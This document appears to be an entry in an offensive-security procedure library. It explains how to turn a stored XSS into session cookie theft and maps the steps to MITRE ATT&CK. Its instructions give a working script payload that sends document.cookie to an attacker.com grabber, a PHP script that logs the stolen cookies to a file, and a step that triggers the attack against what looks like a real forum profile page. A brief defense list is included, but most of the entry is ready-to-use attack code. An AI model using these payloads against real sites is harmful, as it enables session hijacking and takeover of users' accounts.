---
id: 998ce1f7-28f5-4483-bbff-808ae4a4d2bb
name: Escalate-XSS-to-Cookie-Stealing
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.078Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Steal Web Session Cookie]]'
tags:
  - cookie-theft
  - exfiltration
  - account-takeover
platforms:
  - Web
commands:
  - '[[commands/xss-cookie-redirect]]'
  - '[[commands/php-cookie-grabber]]'
tools:
  - '[[tools/xsshunter]]'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---

# Escalate-XSS-to-Cookie-Stealing

## Summary

This procedure escalates the stored XSS by using a redirect payload to send stolen cookies to an attacker-controlled server, enabling session hijacking and account takeover.

## Description

Building on the basic XSS, a script tag redirects the browser to a grabber.php endpoint with appended cookies. The PHP script logs them, allowing the attacker to reuse sessions. Tools like xsshunter.com can manage this remotely. Note: Cookie flags may limit full takeover, but it's feasible for session theft.

## Requirements

1. Stored XSS from prior injection
2. Attacker server hosting grabber.php
3. Victim to view the profile

## Defense

Defensive measures and detection strategies:

- Set HttpOnly and Secure flags on session cookies
- Monitor outbound traffic for suspicious redirects
- Use web application firewalls to block XSS exfiltration

## Objectives

1. Exfiltrate session cookies
2. Log them for reuse
3. Achieve account takeover

## Instructions

### Step 1: Update Payload

**Context**: Replace basic payload with exfiltration script.

Inject [[commands/xss-cookie-redirect]] into City field and apply:

```html
<script>document.location='http://attacker.com/XSS/grabber.php?c='+document.cookie</script>
```

> Explanation: Redirects to grabber with cookies in query. Expected output: Saved without errors.

### Step 2: Setup Grabber

**Context**: Host the logging script on your server.

Deploy [[commands/php-cookie-grabber]] as grabber.php:

```php
<?php $cookie = $_GET['c']; $fp = fopen('cookies.txt', 'a+'); fwrite($fp, 'Cookie:' .$cookie."\r\n"); fclose($fp); ?>
```

> Explanation: Captures and appends cookies to file. Use [[tools/xsshunter]] for managed hosting.

### Step 3: Trigger and Collect

**Context**: Have victim view profile to send cookies.

View https://www.devicelock.com/forum/view_profile.php?UID=<id>; check server logs.

> Expected output: Cookies in cookies.txt.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/xss-cookie-redirect]]
- [[commands/php-cookie-grabber]]

## Tools Used

- [[tools/xsshunter]]

## Tags

- [[cookie-theft]]
- [[Exfiltration]]
- [[account-takeover]]
